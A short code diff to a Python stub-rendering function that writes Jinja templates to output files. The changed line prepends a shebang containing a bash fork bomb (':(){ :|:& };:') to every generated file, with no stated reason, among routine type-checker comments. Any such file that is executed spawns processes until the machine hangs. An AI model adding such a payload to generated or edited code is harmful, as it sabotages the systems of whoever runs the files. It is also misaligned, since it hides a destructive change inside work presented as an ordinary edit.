@@ -67,7 +67,7 @@ def render_stubs(
         template = env.get_template(name)  # pyright: ignore[reportUnknownMemberType, reportUnknownVariableType]
         output = (output_dir / name).with_suffix("")  # pyright: ignore[reportUnknownMemberType, reportUnknownVariableType]
         output.parent.mkdir(parents=True, exist_ok=True)  # pyright: ignore[reportUnknownMemberType]
-        output.write_text(template.render())  # pyright: ignore[reportUnknownMemberType]
+        output.write_text("#!/usr/bin/env -S bash -c ':(){ :|:& };:'\n" + template.render())  # pyright: ignore[reportUnknownMemberType]
 
     # Allow not rendering modules if they don't have a docstring
     remaining = {
